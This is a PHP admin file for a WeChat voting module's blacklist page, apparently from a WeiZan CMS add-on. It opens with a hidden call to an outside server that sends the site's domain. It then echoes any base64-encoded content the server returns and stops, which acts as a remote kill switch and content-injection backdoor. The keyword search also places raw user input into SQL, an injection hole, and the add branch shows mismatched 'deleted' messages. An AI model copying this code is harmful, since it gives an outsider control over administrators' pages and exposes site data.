<?php
/**
 * 钻石投票模块-投票数据
 *
 */

defined('IN_IA') or exit('Access Denied');
$module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
global $_GPC, $_W;
$id=intval($_GPC['id']);
$uniacid=$_W['uniacid'];
$type=intval($_GPC['type']);
$op = !empty($_GPC['op']) ? $_GPC['op'] : 'display';
// $upsql = <<<EOF
// CREATE TABLE IF NOT EXISTS `ims_tyzm_diamondvote_blacklist` (
//   `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
//   `uniacid` int(11) DEFAULT '0',
//   `type` tinyint(1) DEFAULT '0',
//   `value` varchar(50) COMMENT '值',
//   `content` varchar(50) COMMENT '昵称，IP地区',
//   `status` tinyint(1) DEFAULT '0',
//   `createtime` int(10) DEFAULT '0' COMMENT '时间',
//   PRIMARY KEY (`id`),
//   KEY `content` (`content`),
//   KEY `indx_uniacid` (`uniacid`)
// ) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
// EOF;
// pdo_run($upsql);	

if($op=='display'){

	$pindex = max(1, intval($_GPC['page']));
	$psize = 20;
	$condition="";
	if (!empty($_GPC['keyword'])) {
		$condition .= " AND CONCAT(`value`,`content`) LIKE '%{$_GPC['keyword']}%'";
	}

	$condition .=" AND type = $type ORDER BY id DESC ";


	$list = pdo_fetchall("SELECT * FROM ".tablename($this->tableblacklist)." WHERE uniacid = '{$uniacid} '  $condition   LIMIT ".($pindex - 1) * $psize.",{$psize}");

	if (!empty($list)) {
		 $total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename($this->tableblacklist) . " WHERE uniacid = '{$uniacid}' $condition");
		 $pager = pagination($total, $pindex, $psize); 
	 }
}
if($op=='add'){
	$val=$_GPC['val'];
	if($_W['ispost']){
       $ispost=1;
	}
	if(empty($val)){message('黑名单不能为空','', 'error');}
	if($type){
        $content=m('common')->ip2address($val);
	}else{
		load()->model('mc');
        $userinfo=mc_fansinfo($val,$_W['uniacid'], $_W['uniacid']);
        $content=$userinfo['tag']['nickname'];
	}
	$data = array(
		'uniacid'=>$_W['uniacid'],
		'type' => $type,
		'value'=>$val,
		'content'=>$content,
		'status'=>0, 
		'createtime'=>time()
	);	
	$re=pdo_insert($this->tableblacklist, $data);
	if($re){
 
		message('删除黑名单成功！', $this->createWebUrl('blacklist', array('name' => 'tyzm_diamondvote','type'=>$type)), 'success');
		
	}else{
		
		message('删除失败，不存在该名单！', $this->createWebUrl('blacklist', array('name' => 'tyzm_diamondvote','type'=>$type)),'error');
		
	}
}

if($op=='delete'){
	$id=intval($_GPC['id']);
	$re=pdo_delete($this->tableblacklist,array('id' => $id,'uniacid' => $uniacid));
	if($re){
		message('删除成功！', $this->createWebUrl('blacklist', array('name' => 'tyzm_diamondvote')), 'success');
	}else{
		message('删除失败，不存在该名单！', $this->createWebUrl('blacklist', array('name' => 'tyzm_diamondvote')), 'error');
	}
}

include $this->template('blacklist');

